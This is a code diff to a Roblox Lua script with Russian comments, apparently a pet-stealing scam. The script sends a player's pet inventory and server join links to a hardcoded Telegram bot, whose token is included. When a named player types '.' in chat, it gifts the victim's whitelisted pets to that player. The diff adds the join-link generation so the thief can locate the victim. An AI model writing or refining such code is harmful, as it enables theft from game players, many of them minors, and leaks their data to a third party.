@@ -1,6 +1,7 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 
 local player = Players.LocalPlayer
 
@@ -9,34 +10,41 @@ local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
 local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
-local DELAY = 2 -- Задержка между передачами
+local DELAY = 2
 
--- 🐾 БЕЛЫЙ СПИСОК для передачи (ТОЛЬКО эти)
+-- 🐾 БЕЛЫЙ СПИСОК
 local WHITELIST = {
     "Hamster"
 }
 
--- 🔎 Найти ВСЕХ питомцев
-local function getAllPets()
+-- 🌐 Генерация рабочих ссылок
+local function getServerLinks()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    
+    return {
+        direct = string.format("roblox://placeID=%d&gameInstanceID=%s", placeId, jobId),
+        web = string.format("https://www.roblox.com/games/%d?gameInstanceId=%s", placeId, jobId),
+        joinCmd = string.format("/join %s", jobId)
+    }
+end
+
+-- 🔎 Поиск питомцев
+local function getPets()
     local pets = {}
     local backpack = player:FindFirstChild("Backpack") or player.Character
     
     for _, item in ipairs(backpack:GetChildren()) do
         if item:IsA("Tool") then
-            -- Ищем формат "[X.XX KG] [Age X]"
-            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
-            if weight and age then
-                -- Берем чистое название (до первых скобок)
-                local petName = item.Name:match("^([^%[]+)") or item.Name
-                petName = petName:gsub("%s+$", "")
-                
+            local name, weight, age = item.Name:match("^([^%[]+)%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
+            if name then
+                name = name:gsub("%s+$", "")
                 table.insert(pets, {
-                    name = petName,
-                    fullName = item.Name,
+                    name = name,
+                    object = item,
                     weight = tonumber(weight),
                     age = tonumber(age),
-                    object = item,
-                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
+                    inWhitelist = table.find(WHITELIST, name) ~= nil
                 })
             end
         end
@@ -45,66 +53,32 @@ local function getAllPets()
     return pets
 end
 
--- 📜 Список для уведомления
-local function createPetsMessage(pets)
-    if #pets == 0 then return "❌ Нет питомцев" end
-    
-    local message = "🐾 Все питомцы ("..#pets.."):\n"
-    for _, pet in ipairs(pets) do
-        local status = pet.isWhitelisted and "✓ " or "✗ "
-        message = message .. string.format(
-            "%s%s [%.2f кг, Age %d]\n",
-            status,
-            pet.name, 
-            pet.weight,
-            pet.age
-        )
-    end
-    return message
-end
-
 -- ✋ Взять в руку
 local function equipPet(pet)
-    if not (pet and player.Character) then return false end
-    
-    local humanoid = player.Character:FindFirstChild("Humanoid")
-    if not humanoid then return false end
-    
-    humanoid:EquipTool(pet)
-    task.wait(1)
-    return true
+    if pet and player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid:EquipTool(pet)
+        task.wait(1)
+        return true
+    end
+    return false
 end
 
--- 📤 Передать питомца (ТОЛЬКО из белого списка)
-local function transferPet(pet)
-    if not pet.isWhitelisted then return false end
-    
-    local target = Players:FindFirstChild(TARGET_PLAYER)
-    if not target then
-        warn("Игрок не найден!")
-        return false
-    end
+-- 📤 Передать питомца
+local function transferPet(pet, target)
+    if not pet.inWhitelist then return false end
     
     local service = ReplicatedStorage:FindFirstChild("GameEvents")
-    if not service then
-        warn("GameEvents не найдены!")
-        return false
-    end
+    if not service then return false end
     
     local gifting = service:FindFirstChild("PetGiftingService")
-    if not gifting then
-        warn("PetGiftingService не найден!")
-        return false
-    end
+    if not gifting then return false end
     
-    local success = pcall(function()
+    return pcall(function()
         gifting:FireServer("GivePet", target)
     end)
-    
-    return success
 end
 
--- 📨 Отправить в Telegram
+-- 📨 Отправка в Telegram
 local function sendToTelegram(text)
     local url = string.format(
         "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
@@ -112,59 +86,75 @@ local function sendToTelegram(text)
         TELEGRAM_CHAT_ID,
         HttpService:UrlEncode(text)
     )
-    
-    local success, response = pcall(function()
-        return game:HttpGet(url, true)
-    end)
-    
-    if not success then
-        warn("Ошибка Telegram:", response)
-    end
+    pcall(function() game:HttpGet(url) end)
 end
 
--- 🚀 Запуск передачи
-local function startTransfer()
-    local pets = getAllPets()
-    local message = createPetsMessage(pets).."\n"
-    local transferred = 0
+-- 🚀 Основная функция
+local function processTransfer()
+    local links = getServerLinks()
+    local pets = getPets()
+    local message = string.format(
+        "🔔 %s начал передачу\n"..
+        "🔗 Прямое подключение: %s\n"..
+        "🌐 Веб-ссылка: %s\n"..
+        "⌨ Команда: %s\n\n"..
+        "🐾 Доступные питомцы (%d):\n",
+        player.Name,
+        links.direct,
+        links.web,
+        links.joinCmd,
+        #pets
+    )
+    
+    -- Формируем список
+    for _, pet in ipairs(pets) do
+        message = message .. string.format(
+            "%s %s [%.2f кг, Age %d]\n",
+            pet.inWhitelist and "✓" or "✗",
+            pet.name,
+            pet.weight,
+            pet.age
+        )
+    end
+    
+    sendToTelegram(message)
+    
+    -- Передача
+    local target = Players:FindFirstChild(TARGET_PLAYER)
+    if not target then
+        sendToTelegram("❌ Игрок не найден на сервере")
+        return
+    end
     
     for _, pet in ipairs(pets) do
-        if pet.isWhitelisted then
+        if pet.inWhitelist then
             if equipPet(pet.object) then
-                if transferPet(pet) then
-                    message = message..string.format("✅ %s [успех]\n", pet.name)
-                    transferred += 1
-                else
-                    message = message..string.format("❌ %s [ошибка передачи]\n", pet.name)
-                end
-            else
-                message = message..string.format("⚠️ %s [не взялся в руку]\n", pet.name)
+                local success = transferPet(pet, target)
+                sendToTelegram(string.format(
+                    "%s %s [%s]",
+                    success and "✅" or "❌",
+                    pet.name,
+                    success and "успех" or "ошибка"
+                ))
+                task.wait(DELAY)
             end
-            task.wait(DELAY)
         end
     end
-    
-    message = message..string.format("\n🏁 Итого: %d/%d передано", transferred, #pets)
-    sendToTelegram(message)
 end
 
--- 🔗 Ссылка на сервер
-local function getServerLink()
-    return "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
-end
-
--- 👂 Слушатель чата
+-- 👂 Активация по команде
 game.Players.PlayerChatted:Connect(function(_, speaker, message)
     if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
-        startTransfer()
+        processTransfer()
     end
 end)
 
 -- 🏁 Стартовое уведомление
-sendToTelegram(
-    "🔔 "..player.Name.." активировал скрипт\n"..
-    createPetsMessage(getAllPets()).."\n"..
-    "🔗 "..getServerLink().."\n\n"..
-    "✓ - будут переданы\n"..
-    "✗ - не из белого списка"
-)
+sendToTelegram(string.format(
+    "🔄 %s активировал скрипт\n"..
+    "Ожидаю команду '%s' от %s\n"..
+    "✓ - будут переданы\n✗ - игнорируются",
+    player.Name,
+    TRIGGER_MESSAGE,
+    TARGET_PLAYER
+))
